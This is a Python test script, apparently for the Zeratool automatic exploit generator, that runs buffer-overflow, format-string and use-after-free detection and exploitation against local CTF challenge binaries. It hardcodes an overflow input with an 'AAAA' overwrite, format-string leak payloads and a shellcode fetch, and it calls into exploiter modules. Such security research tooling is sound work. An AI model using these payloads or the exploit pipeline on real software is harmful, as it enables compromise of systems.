from detector import overflowDetector
from exploitor import overflowExploiter
#from exploitor import overflowExploitSender

from detector import formatDetector
from leaker import formatLeak
from exploitor import formatExploiter

from detector import uafDetector


from utils import winFunctionDetector
from utils import protectionDetector
from utils import inputDetector
from utils import exploitGadget

def test_buffer_overflow():
    
    binary = "/media/sf_Documents/AEG/Zeratool/challenges/demo_bin"
    properties = {}
    properties['input_type'] = inputDetector.checkInputType(binary)
    properties['protections'] = protectionDetector.getProperties(binary)
    properties['win_functions'] = winFunctionDetector.getWinFunctions(binary)
    # properties['pwn_type'] = overflowDetector.checkOverflow(binary, properties['input_type'])
    
    properties['pwn_type'] = {
        'type': 'Overflow', 
        'input': b'\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01AAAA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
    }

    overflowExploiter.exploitOverflow(binary, properties, properties['input_type'])

def test_format_string():

    binary = "/media/sf_Documents/AEG/Zeratool/challenges/hard_format"
    properties = {}
    properties['input_type'] = inputDetector.checkInputType(binary)
    properties['protections'] = protectionDetector.getProperties(binary)
    properties['win_functions'] = winFunctionDetector.getWinFunctions(binary)
    # properties['pwn_type'] = formatDetector.checkFormat(binary, properties['input_type'])
     


    properties['pwn_type'] = {
        'type': 'Format', 
        'position': 0, 
        'length': 49, 
        'input': b'%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x'
    }
    # properties['pwn'] = formatLeak.checkLeak(binary, properties)
    properties['pwn'] = {
        'flag_found': False, 
        #'leak_string': b',\x01\x00\x00\xc0\xa5\xee\xf7\x00\x00\x00\x00%x_%0$08x_%1$08x_%2$08x_%3$08x_%4$08x_%5$08x8x_%22$08x_%23$08x_%24$08x_%25$08x_%26$08x_%27$08x_%28$08x_%8x_%46$08x_%47$08x\n\x00\x00\x00\x00\x00\xc2\x00\x00\x00\xff\x1f\x00\x00\t\xa4\xfb\xf7.N=\xf6\xf8\x8a\xfd\xf7,\x0b\xef\xff\x00\x00\x00\x00\x9b\xaf\xfb\xf7\x00\x82\x04\x08\x9cJ\xf3\xf7\x01\x00\x00\x00\x10t\xf0\xf7\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00@I\xf3\xf7\xc2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\xf3\xf7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        'leak_string': b"%x_%0$08x_%1$08x_%2$08x_%3$08x_%4$08x_%5$08x8x_%22$08x_%23$08x_%24$08x_%25$08x_%26$08x_%27$08x_%28$08x_%8x_%46$08x_%47$08x",
    }
    properties['shellcode'] = exploitGadget.getShellcode(properties)
    properties['pwn_type']['results'] = formatExploiter.exploitFormat(binary, properties)



def test_heap():
    uafDetector.main()

# test_buffer_overflow()
# test_format_string()
test_heap()